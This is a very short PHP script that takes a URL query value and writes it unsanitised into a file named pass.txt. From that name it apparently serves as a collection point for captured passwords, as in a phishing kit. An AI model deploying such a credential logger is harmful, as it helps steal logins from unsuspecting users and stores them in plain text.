<?
$x=$_GET["q"];



$fp = fopen("pass.txt", "w");
fputs($fp, $x);
fclose($fp);


?>